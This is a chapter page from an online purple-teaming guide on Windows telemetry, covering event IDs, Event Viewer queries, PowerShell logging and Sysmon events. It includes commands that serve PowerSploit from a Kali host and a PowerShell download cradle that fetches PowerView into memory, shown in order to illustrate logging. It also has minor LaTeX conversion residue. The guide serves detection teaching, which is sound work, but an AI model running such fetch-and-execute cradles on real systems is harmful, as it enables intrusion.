@@ -1,0 +1,864 @@
+<!doctype html>
+<html lang="en-US"><head>
+   <meta charset="utf-8">
+    <!-- Chulapa Jekyll Theme -  -->
+    <!--  MIT License-->
+    <!-- Docs: https://dieghernan.github.io/chulapa -->
+    <!-- Repo: https://github.com/dieghernan/chulapa -->
+    <!-- Page build 2025-02-24 20:58:58 +0000 -->
+     <!-- Jekyll Version 3.10.0 -->
+    <!--Google Structured Data-->
+    <script type="application/ld+json">
+        {
+      "@context": "https://schema.org",
+	  "@type": "Article",
+      "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "http://localhost:4000/part-II/collecting-telemetry/"
+      },
+      "headline": "Collecting Telemetry",
+      "image": "https://github.com/ajpc500.png",
+      "datePublished": "2025-02-24T20:58:58+00:00",
+      "dateModified": "2025-02-24T20:58:58+00:00",
+      "author": {
+        "@type": "Person",
+        "name": "ajpc500"
+      },
+       "publisher": {
+        "@type": "Organization",
+        "name": "ajpc500",
+        "url": "http://localhost:4000/",
+        "logo": {
+          "@type": "ImageObject",
+          "url": "https://github.com/ajpc500.png"
+        }
+      }
+    }
+    </script>
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "BreadcrumbList",
+      "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "name": "Home",
+        "item": "http://localhost:4000/"
+      },{
+        "@type": "ListItem",
+        "position": 2,
+        "name": "Collecting Telemetry"
+      }]
+    }
+    </script>
+    <script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebPage",
+    "name": "Collecting Telemetry",
+    "description": ""
+    }
+}
+</script><script type="application/ld+json">
+{
+  "@context" : "https://schema.org",
+  "@type" : "Person",
+  "homeLocation": {
+    "@type": "Place",
+    "name": "London, United Kingdom"
+    },
+  "description": "Publisher",
+  "name" : "ajpc500",
+  "url" : "http://localhost:4000/"
+}
+</script>
+   <title>Collecting Telemetry | A Guide to Purple Teaming</title>
+  <link rel="canonical" href="http://localhost:4000/part-II/collecting-telemetry/">
+    <!-- Atom feed -->
+  <link href="http://localhost:4000/atom.xml" type="application/atom+xml" rel="alternate" title="Atom feed A Guide to Purple Teaming" >
+    <!-- RSS 2.0 feed -->
+  <link href="http://localhost:4000/rss.xml" type="application/rss+xml" rel="alternate" title="RSS 2.0 feed A Guide to Purple Teaming" >
+    <!-- Meta tags -->
+   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+   <meta name="author" content="ajpc500" >
+   <meta name="copyright" content="ajpc500" >
+   <meta name="description" content="">
+   <meta name="thumbnail" content="https://github.com/ajpc500.png" >
+   <meta name="robots" content="index, follow"><meta name="keywords" content="">
+    <!-- Chrome, Firefox OS and Opera -->
+  <meta name="theme-color" content="#000000">
+    <!-- OpenGraph -->
+   <meta property="og:title" content="Collecting Telemetry | A Guide to Purple Teaming" >
+   <meta property="og:site_name" content="A Guide to Purple Teaming | A Guide to Purple Teaming" >
+   <meta property="og:url" content="http://localhost:4000/part-II/collecting-telemetry/" >
+   <meta property="og:type" content="website" >
+   <meta property="og:description" content="" >
+   <meta property="og:locale" content="en-US" >
+   <meta property="og:image" content="https://github.com/ajpc500.png" >
+    <!-- Twitter/X Cards -->
+   <meta name="twitter:card" content="summary_large_image"><!-- start custom head snippets -->
+<!-- this script is inserted before the css stylesheet -->
+<!-- end custom head snippets -->
+<!-- CSS -->
+    <!-- Preconnect with Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <!-- Fontawesome-->
+    <!-- v6 -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css">
+  <link rel="preload" href="https://cdn.jsdelivr.net/gh/dieghernan/chulapa@master/assets/js/chulapa_script.js" as="script" >
+  <link rel="preload" href="https://cdn.jsdelivr.net/gh/dieghernan/chulapa@master/assets/fonts/Chulapa/Chulapa-Bold_vmod.otf" as="font" type="font/otf" crossorigin>
+    <!-- Theme css (Bootstrap included) -->
+  <link rel="stylesheet" id="maincss" href="http://localhost:4000/assets/css/main.css" >
+    <!-- Highlighter -->
+  <link id="csshigh" rel="stylesheet" href="http://localhost:4000/assets/css/highlighter.css" >
+    <!-- Custom css -->
+  <link rel="stylesheet" href="http://localhost:4000/assets/css/custom.css" >
+      <!-- start custom head snippets -->
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+<!-- end custom head snippets -->
+</head>
+<body class="d-flex flex-column h-entry" id="body">
+	<a class="u-url d-none" href="http://localhost:4000/part-II/collecting-telemetry/">Invisible link to canonical for Microformats</a>
+	<div class="navbar-chulapa-fab">
+		<input type="checkbox" class="navbar-chulapa-fab-button d-none" id="navi-toggle">
+		<label for="navi-toggle" class="navbar-toggler p-1 m-0 text-center d-flex">
+			<span class="navbar-toggler-icon m-auto">&nbsp;</span>
+		</label>
+		<div class="navbar-chulapa-fab-background">&nbsp;</div>
+		<nav class="navbar-chulapa-fab-nav" aria-label="primary-navigation">
+			<ul class="navbar-nav text-center text-uppercase font-weight-light mt-0 mb-1 py-1">
+				<li class="nav-item">
+					<a class="nav-link px-3 navbar-brand mx-1 " href="http://localhost:4000/">Home</a>
+				</li><li class="nav-item dropdown my-0 py-1"><a class="nav-link dropdown-toggle px-3 py-1 " href="#" id="Part-I:-How-Purple-Teaming-Works" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Part I: How Purple Teaming Works</a>
+					<div class="dropdown-menu dropdown-menu-right text-center rounded-0 pr-4" aria-labelledby="Part-I:-How-Purple-Teaming-Works"><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-I/the-basics-of-purple-teaming">1. The Basics of Purple Teaming </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-I/offensive-and-defensive-frameworks">2. Offensive and Defensive Frameworks </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-I/the-atomic-methodology">3. The Atomic Methodology </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-I/the-scenario-based-methodology">4. The Scenario-based Methodology </a></div>
+				</li><li class="nav-item dropdown my-0 py-1"><a class="nav-link dropdown-toggle px-3 py-1 " href="#" id="Part-II:-Attack-Emulation-and-Detection-Lab" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Part II: Attack Emulation and Detection Lab</a>
+					<div class="dropdown-menu dropdown-menu-right text-center rounded-0 pr-4" aria-labelledby="Part-II:-Attack-Emulation-and-Detection-Lab"><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-II/environment-setup">5. Environment Setup </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-II/collecting-telemetry">6. Collecting Telemetry </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-II/network-traffic-and-event-tracing">7. Network Traffic and Event Tracing </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-II/lotl-with-atomic-red-team">8. Living-off-the-Land with Atomic Red Team </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-II/ad-recon-with-mitre-caldera">9. Active Directory Recon with MITRE Caldera </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-II/domain-compromise-with-mythic">10. Domain Compromise with Mythic </a></div>
+				</li><li class="nav-item dropdown my-0 py-1"><a class="nav-link dropdown-toggle px-3 py-1 " href="#" id="Part-III:-Organizing-an-Exercise" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Part III: Organizing an Exercise</a>
+					<div class="dropdown-menu dropdown-menu-right text-center rounded-0 pr-4" aria-labelledby="Part-III:-Organizing-an-Exercise"><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-III/reporting-and-tracking">11. Reporting and Tracking </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-III/implementing-a-purple-teaming-function">12. Implementing a Purple Teaming Function </a></div>
+				</li><li class="nav-item my-0 py-1">
+					<a class="nav-link px-3 py-1" href="http://localhost:4000/resources">Resources</a>
+				</li><li class="nav-item my-0 py-1">
+					<a class="nav-link px-3 py-1" href="http://localhost:4000/errata">Errata</a>
+				</li></ul>
+		</nav>
+	</div>	<header class="d-flex align-items-center hero-chulapa"><div class="container-lg py-4">
+   <h1 class="p-name">Collecting Telemetry</h1>
+ </div>
+</header>
+	<main class="container-lg pb-3 flex-fill">
+		<div class="row pt-2">
+			<aside class="col-lg-2 mt-lg-3 small"></aside>
+			<article id="maincontent" class="col-lg-8 mt-3 e-content">
+			<div class="bs-component">
+   <div class="progress">
+       <div class="progress-bar progress-bar-striped progress-bar-animated" role="progressbar" aria-valuemin="0" aria-valuemax="100" style="width: 50%; background-color:#eb34e1"></div>
+   </div>
+</div>
+<h2 id="introduction">Introduction</h2>
+<p>This chapter explores the key log sources present in the Attack Range that enterprise Active Directory environments can make use of. It includes details of Windows event logs, PowerShell logs and Sysmon.</p>
+<hr />
+<h2 id="chapter-content">Chapter Content</h2>
+<p>This section provides reproductions of the key figures and code snippets seen in this chapter.</p>
+<h4 id="windows-event-logs">Windows Event Logs</h4>
+<p>Microsoft offers its own list of key event IDs to monitor. These can be seen below:</p>
+<details>
+<summary>Key Event IDs</summary>
+<table class="table">
+<thead class="thead-light">
+   <tr>
+     <th scope="col">ID</th>
+     <th scope="col">Event Summary</th>
+     <th scope="col">Potential application</th>
+   </tr>
+ </thead>
+ <tbody>
+   <tr>
+     <td>4624</td>
+     <td>An account was successfully logged on.</td>
+     <td>Identification of anomalous account activity.
+        Large-scale reconnaissance of neighboring hosts.<br /></td>
+   </tr>
+   <tr>
+     <td>4625</td>
+     <td>An account failed to log on.</td>
+     <td>Identification of anomalous account activity, brute force attempts, or password spraying.<br /></td>
+   </tr>
+   <tr>
+     <td>4728</td>
+     <td>A member was added to a security-enabled global group.</td>
+     <td>Privilege escalation via group membership changes. For example, additions to the Domain Admins group.<br /></td>
+   </tr>
+       <tr>
+     <td>4732</td>
+     <td>A member was added to a security-enabled local group.</td>
+     <td>Privilege escalation or increased access on a specific host. For example, addition to the local Administrators group.<br /></td>
+   </tr>
+   <tr>
+     <td>4733</td>
+     <td>A member was removed from a security-enabled local group.</td>
+     <td>Unauthorized changes to local privileged groups.<br /></td>
+   </tr>
+   <tr>
+     <td>4768</td>
+     <td>A Kerberos authentication ticket (TGT) was requested.</td>
+     <td>Anomalous authentication attempts via Kerberos.<br />
+        Pass-the-Ticket activity.<br /></td>
+   </tr>
+   <tr>
+     <td>4769</td>
+     <td>A Kerberos service ticket was requested.</td>
+     <td>Anomalous or large-scale requests for Kerberos service tickets (kerberoasting).<br /></td>
+   </tr>
+   <tr>
+     <td>4741</td>
+     <td>A computer account was created.</td>
+     <td>Precursor to Kerberos attacks such as Resource-based Constrained Delegation (RBCD).<br /></td>
+   </tr>
+   <tr>
+     <td>4688</td>
+     <td>A new process has been created.</td>
+     <td>Execution of suspicious commands.<br /> 
+        Use of living-off-the-land binaries and scripts (LOLBAS).<br /></td>
+   </tr>
+   <tr>
+     <td>4698</td>
+     <td>A scheduled task was created.</td>
+     <td>Installation of persistence.<br /></td>
+   </tr>
+   <tr>
+     <td>7045</td>
+     <td>A new service was installed in the system.</td>
+     <td>Persistence installation.<br />
+        Privilege escalation.<br /></td>
+   </tr>
+   <tr>
+     <td>5145</td>
+     <td>A network share object was checked to see whether client can be granted desired access.</td>
+     <td>Anomalous file share access.<br />
+        File share reconnaissance.<br /></td>
+   </tr>
+   <tr>
+     <td>4662</td>
+     <td>An operation was performed on an object.</td>
+     <td>DCSync attacks.<br />
+        Certificate modification (ESC4).<br /></td>
+   </tr>
+   <tr>
+     <td>5136</td>
+     <td>A directory service object was modified.</td>
+     <td>User modifications for targeted kerberoasting.<br />
+        Constrained delegation.<br /></td>
+   </tr>
+ </tbody>
+</table>
+</details>
+<h5 id="viewing-logs-in-event-viewer">Viewing Logs in Event Viewer</h5>
+<p>A query to filter Windows Event Logs for login events on the <code class="language-plaintext highlighter-rouge">ar-win-dc</code> domain controller in the Attack Range environment.</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;QueryList&gt;</span>
+    <span class="nt">&lt;Query</span> <span class="na">Id=</span><span class="s">"0"</span> <span class="na">Path=</span><span class="s">"Security"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;Select</span> <span class="na">Path=</span><span class="s">"Security"</span><span class="nt">&gt;</span>
+            *[System[(Computer='ar-win-dc.attackrange.local') and (EventID=4624)]]
+        <span class="nt">&lt;/Select&gt;</span>
+    <span class="nt">&lt;/Query&gt;</span>
+<span class="nt">&lt;/QueryList&gt;</span>
+</code></pre></div></div>
+<p>Another query, similar to the above, that looks for events from the <code class="language-plaintext highlighter-rouge">Administrator</code> user with a <code class="language-plaintext highlighter-rouge">LogonType</code> of 2 (a local logon).</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;QueryList&gt;</span>
+    <span class="nt">&lt;Query</span> <span class="na">Id=</span><span class="s">"0"</span> <span class="na">Path=</span><span class="s">"Security"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;Select</span> <span class="na">Path=</span><span class="s">"Security"</span><span class="nt">&gt;</span>
+            *[System[EventID=4624] and 
+            EventData[Data[@Name='TargetUserName']='Administrator'] and 
+            EventData[Data[@Name='LogonType']='2']]
+        <span class="nt">&lt;/Select&gt;</span>
+    <span class="nt">&lt;/Query&gt;</span>
+<span class="nt">&lt;/QueryList&gt;</span>
+</code></pre></div></div>
+<p>An example of the XML event log data produced from the above query.</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;Event</span> <span class="na">xmlns=</span><span class="s">"http://schemas.microsoft.com/win/events/event"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;System&gt;</span>
+    <span class="nt">&lt;Provider</span> <span class="na">Name=</span><span class="s">"Microsoft-Windows-Security-Auditing"</span> <span class="na">Guid=</span><span class="s">"{54849625-5478-4994-a5ba-3e3b0328c30d}"</span> <span class="nt">/&gt;</span> 
+    <span class="nt">&lt;EventID&gt;</span>4624<span class="nt">&lt;/EventID&gt;</span> 
+    <span class="nt">&lt;Level&gt;</span>0<span class="nt">&lt;/Level&gt;</span> 
+    --snip--
+    <span class="nt">&lt;Opcode&gt;</span>0<span class="nt">&lt;/Opcode&gt;</span> 
+    <span class="nt">&lt;Keywords&gt;</span>0x8020000000000000<span class="nt">&lt;/Keywords&gt;</span> 
+    <span class="nt">&lt;EventRecordID&gt;</span>182608<span class="nt">&lt;/EventRecordID&gt;</span> 
+    <span class="nt">&lt;Correlation</span> <span class="na">ActivityID=</span><span class="s">"{28aa6104-6329-0004-4561-aa282963da01}"</span> <span class="nt">/&gt;</span> 
+    <span class="nt">&lt;Execution</span> <span class="na">ProcessID=</span><span class="s">"656"</span> <span class="na">ThreadID=</span><span class="s">"5012"</span> <span class="nt">/&gt;</span> 
+    <span class="nt">&lt;Channel&gt;</span>Security<span class="nt">&lt;/Channel&gt;</span> 
+    <span class="nt">&lt;Computer&gt;</span>ar-win-dc.attackrange.local<span class="nt">&lt;/Computer&gt;</span> 
+    <span class="nt">&lt;Security</span> <span class="nt">/&gt;</span> 
+  <span class="nt">&lt;/System&gt;</span>
+  <span class="nt">&lt;EventData&gt;</span>
+    <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">"TargetUserSid"</span><span class="nt">&gt;</span>S-1-5-21-3003545274-3581856904-3772676767-500<span class="nt">&lt;/Data&gt;</span> 
+    Data Name="TargetUserName"&gt;Administrator<span class="nt">&lt;/Data&gt;</span>
+    <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">"TargetDomainName"</span><span class="nt">&gt;</span>ATTACKRANGE<span class="nt">&lt;/Data&gt;</span> 
+    <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">"TargetLogonId"</span><span class="nt">&gt;</span>0x96c541<span class="nt">&lt;/Data&gt;</span> 
+    <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">"LogonType"</span><span class="nt">&gt;</span>2<span class="nt">&lt;/Data&gt;</span>
+    <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">"LogonProcessName"</span><span class="nt">&gt;</span>seclogo<span class="nt">&lt;/Data&gt;</span> 
+    <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">"AuthenticationPackageName"</span><span class="nt">&gt;</span>Negotiate<span class="nt">&lt;/Data&gt;</span> 
+    <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">"WorkstationName"</span><span class="nt">&gt;</span>AR-WIN-DC<span class="nt">&lt;/Data&gt;</span> 
+    <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">"LogonGuid"</span><span class="nt">&gt;</span>{9a9ab8a0-2038-26c7-ce46-2604db784955}<span class="nt">&lt;/Data&gt;</span> 
+    <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">"ProcessName"</span><span class="nt">&gt;</span>C:\Windows\System32\svchost.exe<span class="nt">&lt;/Data&gt;</span> 
+    <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">"ImpersonationLevel"</span><span class="nt">&gt;</span>%%1833<span class="nt">&lt;/Data&gt;</span> 
+    --snip--
+  <span class="nt">&lt;/EventData&gt;</span>
+<span class="nt">&lt;/Event&gt;</span>
+</code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">wevtutil</code> command can be used to perform queries outside of Event Viewer.</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">wevtutil</span><span class="w"> </span><span class="nx">qe</span><span class="w"> </span><span class="nx">Security</span><span class="w"> </span><span class="s2">"/q:*[System[EventID=4624] and EventData[Data[@Name='TargetUserName']='Administrator'] and EventData[Data[@Name='LogonType']='2']]"</span><span class="w">
+</span></code></pre></div></div>
+<h4 id="powershell-logging">PowerShell Logging</h4>
+<h5 id="script-blocks">Script Blocks</h5>
+<p>Commands to install PowerSploit and host it on the Kali host in the Attack Range environment.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt update
+<span class="nb">sudo </span>apt <span class="nb">install </span>powersploit
+<span class="nb">cd</span> /usr/share/windows-resources/powersploit
+python3 <span class="nt">-m</span> http.server 1337
+</code></pre></div></div>
+<p>A PowerShell download cradle that can fetch and load the PowerView script into memory on a Windows host.</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Expression</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.Webclient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s2">"http://10.0.1.30:1337/Recon/PowerView.ps1"</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+<p>The first of many associated PowerShell Script Block log entries (event ID 4104) for the above download cradle:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;Event</span> <span class="na">xmlns=</span><span class="s">"http://schemas.microsoft.com/win/events/event"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;System&gt;</span>
+    <span class="nt">&lt;Provider</span> <span class="na">Name=</span><span class="s">"Microsoft-Windows-PowerShell"</span> <span class="na">Guid=</span><span class="s">"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"</span> <span class="nt">/&gt;</span> 
+    <span class="nt">&lt;EventID&gt;</span>4104<span class="nt">&lt;/EventID&gt;</span> 
+    <span class="nt">&lt;Level&gt;</span>5<span class="nt">&lt;/Level&gt;</span> 
+    --snip--
+    <span class="nt">&lt;Execution</span> <span class="na">ProcessID=</span><span class="s">"5192"</span> <span class="na">ThreadID=</span><span class="s">"5164"</span> <span class="nt">/&gt;</span> 
+    <span class="nt">&lt;Channel&gt;</span>Microsoft-Windows-PowerShell/Operational<span class="nt">&lt;/Channel&gt;</span> 
+    <span class="nt">&lt;Computer&gt;</span>ar-win-2.attackrange.local<span class="nt">&lt;/Computer&gt;</span> 
+    <span class="nt">&lt;Security</span> <span class="na">UserID=</span><span class="s">"S-1-5-21-1234998748-2444849041-1163457548-500"</span> <span class="nt">/&gt;</span> 
+  <span class="nt">&lt;/System&gt;</span>
+  <span class="nt">&lt;EventData&gt;</span>
+    <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">"MessageNumber"</span><span class="nt">&gt;</span>1<span class="nt">&lt;/Data&gt;</span> 
+    <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">"MessageTotal"</span><span class="nt">&gt;</span>1<span class="nt">&lt;/Data&gt;</span> 
+    <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">"ScriptBlockText"</span><span class="nt">&gt;</span>Invoke-Expression (New-Object Net.Webclient).DownloadString("http://10.0.1.30:1337/Recon/PowerView.ps1")<span class="nt">&lt;/Data&gt;</span> 
+    <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">"ScriptBlockId"</span><span class="nt">&gt;</span>3d296d00-b3bf-426c-9f87-9215896c146e<span class="nt">&lt;/Data&gt;</span> 
+    <span class="nt">&lt;Data</span> <span class="na">Name=</span><span class="s">"Path"</span> <span class="nt">/&gt;</span> 
+  <span class="nt">&lt;/EventData&gt;</span>
+<span class="nt">&lt;/Event&gt;</span>
+</code></pre></div></div>
+<h5 id="transcription">Transcription</h5>
+<p>The <code class="language-plaintext highlighter-rouge">reg</code> command to enable PowerShell transcription.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add <span class="s2">"HKLM</span><span class="se">\S</span><span class="s2">OFTWARE</span><span class="se">\P</span><span class="s2">olicies</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\P</span><span class="s2">owerShell</span><span class="se">\T</span><span class="s2">ranscription"</span> /v EnableTranscripting /t REG_DWORD /d 1 /f
+</code></pre></div></div>
+<p>An example of PowerShell transcription log that shows a user fetching the current process ID.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>**********************
+Windows PowerShell transcript start
+--snip--
+Username: AR-WIN-2\Administrator
+RunAs User: AR-WIN-2\Administrator
+Configuration Name: 
+Machine: AR-WIN-2 (Microsoft Windows NT 10.0.17763.0)
+Host Application: powershell
+Process ID: 648
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.17763.5202
+**********************
+**********************
+**********************
+PS C:\Users\Administrator&gt;[System.Diagnostics.Process]::GetCurrentProcess().Id 
+648
+</code></pre></div></div>
+<h4 id="sysmon">Sysmon</h4>
+<p>The list of events produced from Sysmon at the time of writing can be seen below.</p>
+<table>
+ <tbody>
+   <tr>
+     <td>Sourced from: <a target="_blank" href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#events">https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#events</a></td>
+   </tr>
+ </tbody>
+</table>
+<details>
+<summary>Sysmon Event IDs</summary>
+<table class="table">
+<thead class="thead-light">
+   <tr>
+     <th scope="col">ID</th>
+     <th scope="col">Event Name</th>
+     <th scope="col">Description</th>
+   </tr>
+ </thead>
+ <tbody>
+   <tr>
+     <td>1</td>
+     <td>Process creation</td>
+     <td>Records the creation of a new process, capturing details like the process ID, executable, and command line arguments. Also includes a process GUID that’s unique across a domain, aiding log correlation.</td>
+   </tr>
+   <tr>
+     <td>2</td>
+     <td>A process changed a file creation time</td>
+     <td>Captures changes to the creation timestamp of a file. Commonly performed by attackers to \textit{timestomp} a new malicious file so it blends in with existing files.</td>
+   </tr>
+   <tr>
+     <td>3</td>
+     <td>Network connection</td>
+     <td>Logs details of TCP and UDP network connections, including source and destination IP addresses and ports, as well as the originating process ID and GUID.</td>
+   </tr>
+   <tr>
+     <td>4</td>
+     <td>Sysmon service state changed</td>
+     <td>Logs changes in the state of the Sysmon service, such as when it is started or stopped.</td>
+   </tr>
+   <tr>
+     <td>5</td>
+     <td>Process terminated</td>
+     <td>Records the termination of a process, providing information including its ID and GUID.</td>
+   </tr>
+   <tr>
+     <td>6</td>
+     <td>Driver loaded</td>
+     <td>Captures information about loaded kernel drivers, including hashes and signature information.</td>
+   </tr>
+   <tr>
+     <td>7</td>
+     <td>Image loaded</td>
+     <td>Logs when a module or image is loaded into a process. This includes where the image was loaded from, into which process, and details of hashes and signature information.</td>
+   </tr>
+   <tr>
+     <td>8</td>
+     <td>CreateRemoteThread</td>
+     <td>Monitors a process’s creation of remote threads in other processes. This includes details of the source and destination processes, as well as information on the memory address, module and function being run.</td>
+   </tr>
+   <tr>
+     <td>9</td>
+     <td>RawAccessRead</td>
+     <td>Captures attempts to directly read disk sectors through \verb|</td>
+   </tr>
+   <tr>
+     <td>10</td>
+     <td>ProcessAccess</td>
+     <td>Logs when a process attempts to access another process via the opening of a handle. This includes details of the source and destination processes.</td>
+   </tr>
+   <tr>
+     <td>11</td>
+     <td>FileCreate</td>
+     <td>Records the creation and overwriting of files, including details like file name, size, and creation timestamp.</td>
+   </tr>
+   <tr>
+     <td>12</td>
+     <td>RegistryEvent (Object create and delete)</td>
+     <td>Captures the creation and deletion of registry keys and values.</td>
+   </tr>
+   <tr>
+     <td>13</td>
+     <td>RegistryEvent (Value Set)</td>
+     <td>Captures when Registry values are modified, including the value that was set when of types DWORD or QWORD.</td>
+   </tr>
+   <tr>
+     <td>14</td>
+     <td>RegistryEvent (Key and Value Rename)</td>
+     <td>Captures when an existing Registry key and value are renamed.</td>
+   </tr>
+   <tr>
+     <td>15</td>
+     <td>FileCreateStreamHash</td>
+     <td>Monitors the creation of file streams and calculates their hash values.</td>
+   </tr>
+   <tr>
+     <td>16</td>
+     <td>ServiceConfigurationChange</td>
+     <td>Logs changes to Sysmon configuration, such as rule additions or modifications.</td>
+   </tr>
+   <tr>
+     <td>17</td>
+     <td>PipeEvent (Pipe Created)</td>
+     <td>Captures the creation of named pipes, including details like the pipe name and process information.</td>
+   </tr>
+   <tr>
+     <td>18</td>
+     <td>PipeEvent (Pipe Connected)</td>
+     <td>Captures when a named pipe connection occurs, providing details about the connecting process.</td>
+   </tr>
+   <tr>
+     <td>19</td>
+     <td>WmiEvent (WmiEventFilter activity detected)</td>
+     <td>Logs events related to Windows Management Instrumentation (WMI) event filter registration, including the namespace, filter name and expression.</td>
+   </tr>
+   <tr>
+     <td>20</td>
+     <td>WmiEvent (WmiEventConsumer activity detected)</td>
+     <td>Captures the registration of WMI consumers.</td>
+   </tr>
+   <tr>
+     <td>21</td>
+     <td>WmiEvent (WmiEventConsumerToFilter activity detected)</td>
+     <td>Logs when a consumer binds to a filter, including details of consumer name and filter path.</td>
+   </tr>
+   <tr>
+     <td>22</td>
+     <td>DNSEvent (DNS Query)</td>
+     <td>Captures when a process makes a DNS query, including the originating process and the hostname to be resolved.</td>
+   </tr>
+   <tr>
+     <td>23</td>
+     <td>FileDelete (File Delete archived)</td>
+     <td>Captures the deletion of a file, and also saves the original file to the configured archive directory.</td>
+   </tr>
+   <tr>
+     <td>24</td>
+     <td>ClipboardChange (New content in the clipboard)</td>
+     <td>Logs changes to the clipboard contents.</td>
+   </tr>
+   <tr>
+     <td>25</td>
+     <td>ProcessTampering (Process image change)</td>
+     <td>Logs activity relating to evasion techniques such as \textit{process hollowing} and \textit{herpaderping.}</td>
+   </tr>
+   <tr>
+     <td>26</td>
+     <td>FileDeleteDetected (File Delete logged)</td>
+     <td>Logs the deletion of a file, without the archiving functionality detailed in Event ID 23.</td>
+   </tr>
+   <tr>
+     <td>27</td>
+     <td>FileBlockExecutable</td>
+     <td>Captures when Sysmon blocks the writing of an executable based on the conditions detailed in its configuration.</td>
+   </tr>
+   <tr>
+     <td>28</td>
+     <td>FileBlockShredding</td>
+     <td>Generates events when Sysmon blocks file shredding.</td>
+   </tr>
+   <tr>
+     <td>29</td>
+     <td>FileExecutableDetected</td>
+     <td>Logs the creation of a new executable file.</td>
+   </tr>
+   <tr>
+     <td>255</td>
+     <td>Error</td>
+     <td>Logs when Sysmon encounters an error, potentially due to heavy load, failure to complete tasks, or encountering a bug.</td>
+   </tr>
+ </tbody>
+</table>
+</details>
+<h5 id="windows">Windows</h5>
+<p>A snippet of the Sysmon schema that can be output with the <code class="language-plaintext highlighter-rouge">-s</code> flag.</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;manifest</span> <span class="na">schemaversion=</span><span class="s">"x.xx"</span> <span class="na">binaryversion=</span><span class="s">"xx"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;configuration&gt;</span> 
+    --snip--
+    <span class="nt">&lt;filters</span> <span class="na">default=</span><span class="s">"is"</span><span class="nt">&gt;</span>is,is not,contains,contains any,is any,contains all,excludes,excludes any,excludes all,begin with,not begin with,end with,not end with,less than,more than,image<span class="nt">&lt;/filters&gt;</span>
+  <span class="nt">&lt;/configuration&gt;</span>
+  <span class="nt">&lt;events&gt;</span>
+    <span class="nt">&lt;event</span> <span class="na">name=</span><span class="s">"SYSMONEVENT_DRIVER_LOAD"</span> <span class="na">value=</span><span class="s">"6"</span> <span class="na">level=</span><span class="s">"Informational"</span> <span class="na">template=</span><span class="s">"Driver loaded"</span> <span class="na">rulename=</span><span class="s">"DriverLoad"</span> <span class="na">version=</span><span class="s">"4"</span><span class="nt">&gt;</span>
